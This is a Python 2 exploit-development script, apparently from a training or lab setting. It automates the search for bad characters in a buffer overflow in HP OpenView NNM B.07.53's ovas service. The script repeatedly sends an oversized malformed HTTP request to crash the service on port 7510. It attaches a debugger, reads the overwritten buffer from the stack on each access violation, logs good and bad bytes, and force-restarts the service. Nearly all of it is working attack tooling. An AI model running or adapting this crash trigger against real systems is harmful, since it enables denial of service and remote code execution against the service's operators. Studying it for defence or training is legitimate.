#!/usr/bin/env python

# Description: Identify good and bad chars in HPNNM-B.07.53
# author: greyshell

# Script requirements: python 2.7 x86, pydbg 32bit binary, python wmi, pywin32
# Copy pydbg inside C:\Python27\Lib\site-packages\
# Copy pydasm.pyd inside C:\Python27\Lib\site-packages\pydbg\

import os
import socket
import subprocess
import sys
import threading
import time
import wmi

from pydbg import *
from pydbg.defines import *

# Global variables
allchars = (
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13"
    "\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    "\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39"
    "\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c"
    "\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72"
    "\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85"
    "\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98"
    "\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab"
    "\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe"
    "\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1"
    "\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4"
    "\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    "\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

request_template = (
    "GET /topology/homeBaseView HTTP/1.1\r\n"
    "Host: {}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
    "Content-Length: 1048580\r\n\r\n"
)

# Current char that is being checked
cur_char = ""    
badchars = []
goodchars = []
evil_str_sent = False
service_is_running = False


def chars_to_str(chars):
	# Convert a list of chars to a string
	result = ""
	for char in chars:
		result += "\\x{:02x}".format(ord(char))
	return result


def crash_service():
	# Send malformed data to ovas service in order to crash it. Function runs in an independent thread
	global evil_str_sent, cur_char, badchars, goodchars, allchars
	global service_is_running
	
	char_counter = -1
	timer = 0
	while True:
		# Don't send evil string if process is not running
		if not service_is_running:   
			time.sleep(1)
			continue
		
		# If main loop reset the evil_str_sent flag to False, sent evil_str again
		if not evil_str_sent:
			timer = 0
			
			char_counter += 1
			if char_counter > len(allchars)-1:
				print("[+] Bad chars: {}.".format(chars_to_str(badchars)))
				print("[+] Good chars: {}.".format(chars_to_str(goodchars)))
				print("[+] Done.")
				
				# Hack to exit application from non-main thread
				os._exit(0) 
			
			cur_char = allchars[char_counter]
			# During crash [ESP + 4C] points to ("A" * 1025)th  position 
			crash = "A" * 1025 + cur_char * 4  + "B" * 2551
			evil_str = request_template.format(crash)
			
			print("[+] Sending evil HTTP request...")
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.connect(("127.0.0.1", 7510))
				sock.send(evil_str)
				sock.close()
			except:
				print("[+] Error sending malicious buffer; service may be down.")
				print("[+] Restarting the service and retrying...")
				
				service_is_running = False
				subprocess.Popen('taskkill /f /im ovas.exe').communicate()
			finally:
				evil_str_sent = True
				
		else:
			if timer > 10:
				print("[+] 10 seconds passed without a crash. Bad char probably prevented the crash.")
				print("[+] Marking last char as bad and killing the service...")
				
				badchars.append(cur_char)
				print("[+] Bad chars so far: {}.".format(chars_to_str(badchars)))
				
				with open("badchars.txt",'w') as f:
					f.write(chars_to_str(badchars))
				
				service_is_running = False
				subprocess.Popen('taskkill /f /im ovas.exe').communicate()
								
			time.sleep(1)
			timer += 1
	return


def is_service_started():
	# Check if service was successfully started
	print("[+] Making sure the service was restarted...")
	service_check_counter = 0
	while not service_is_running:
		if service_check_counter > 4: # Give it 5 attempts
			return False
		for process in wmi.WMI().Win32_Process():
			if process.Name=='ovas.exe':
				return process.ProcessId
		service_check_counter += 1
		time.sleep(1)


def is_service_responsive():
	# Check if service responds to HTTP requests
	print("[+] Making sure the service responds to HTTP requests...")
	service_check_counter = 0
	while not service_is_running:
		# Give it 5 attempts
		if service_check_counter > 4: 
			return False
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect(("127.0.0.1", 7510))
			test_str = request_template.format("127.0.0.1")
			sock.send(test_str)
			# Give response 1 second to arrive
			sock.settimeout(1.0) 
			resp = sock.recv(1024)
			if resp:
				return True
			sock.close()
		except Exception as e:
			pass
			
		service_check_counter += 1

		
def restart_service():
	# Restart ovas.exe service and return its PID
	global service_is_running
	service_is_running = False
	
	# Check that the service is running before stopping it
	for process in wmi.WMI().Win32_Process():
		if process.Name=='ovas.exe':
			print("[+] Stopping the service...")
			# Forcefully terminate the process
			subprocess.Popen('taskkill /f /im ovas.exe').communicate()
			
	print("[+] Starting the service...")
	# Start the process with reliability 
	subprocess.Popen('ovstop -c ovas').communicate()
	subprocess.Popen('ovstart -c ovas').communicate() 
	
	pid = is_service_started()
	if pid:
		print("[+] The service was restarted.")
	else:
		print("[-] Service was not found in process list. Restarting...")
		return restart_service()
		
	if is_service_responsive():
		print("[+] Service responds to HTTP requests. Green ligth.")
		service_is_running = True
		return pid
	else:
		print("[-] Service does not respond to HTTP requests. Restarting...")
		return restart_service()
	


def check_char(rawdata):
	# Compare the buffer sent with the one in memory to see if it has been mangled in order to identify bad characters.
	global badchars, goodchars
	hexdata = dbg.hex_dump(rawdata)
	print("[+] Buffer: {}".format(hexdata))
	
	# Sent data must be equal to data in memory 
	if rawdata == (cur_char * 4):
		goodchars.append(cur_char)
		print("[+] Char {} is good.".format(chars_to_str(cur_char)))
		print("[+] Good chars so far: {}.".format(chars_to_str(goodchars)))
		with open("goodchars.txt",'w') as f:
			f.write(chars_to_str(goodchars))
	
	else:
		badchars.append(cur_char)
		print("[+] Char {} is bad.".format(chars_to_str(cur_char)))
		print("[+] Bad chars so far: {}.".format(chars_to_str(badchars)))
		with open("badchars.txt",'w') as f:
			f.write(chars_to_str(badchars))
	return

	
def _access_violation_handler(dbg):
	# On access violation read data from a pointer on the stack to determine if the sent buffer was mangled in any way
	print("[+] Access violation caught.")
	
	# [ESP + 0x4C] points to our test buffer
	esp_offset = 0x4C
	buf_address = dbg.read(dbg.context.Esp + esp_offset, 0x4)
	buf_address = dbg.flip_endian_dword(buf_address)
	
	print("[+] [DEBUG] buf_address: {}".format(buf_address))
	
	if buf_address:
		# Read 4 bytes test buffer 
		buffer = dbg.read(buf_address, 0x4)
		print("[+] buffer is " + buffer);
	else:
		# Now when the first request sent is the one for checking if the
		# service responds, the buf_address sometimes returns 0. This is to 
		# handle that case.
		buffer = ""
		
	print("[+] Checking whether the char is good or bad...")
	check_char(buffer)
	dbg.detach()
	
	return DBG_EXCEPTION_NOT_HANDLED

	
def debug_process(pid):
	# Create a debugger instance and attach to minishare PID"""
	dbg = pydbg()
	dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, _access_violation_handler)
	
	while True:
		try:
			print("[+] Attaching debugger to pid: {}.".format(pid))
			if dbg.attach(pid):
				return dbg
			else:
				return False
		except Exception as e:
			print("[+] Error while attaching: {}.".format(e.message))
			return False

			
if __name__ == '__main__':
	# Create and start crasher thread
	crasher_thread = threading.Thread(target=crash_service)
	crasher_thread.setDaemon(0)
	crasher_thread.start()
	print("[+] thread started");
	# Main loop
	while True:
		pid = restart_service()
		print("[+] restart_service "+str(pid));
		dbg = debug_process(pid)
		print("[+] dbg started");
		if dbg:
			# Tell crasher thread to send malicious input to process
			evil_str_sent = False
			# Enter the debugging loop 
			dbg.run()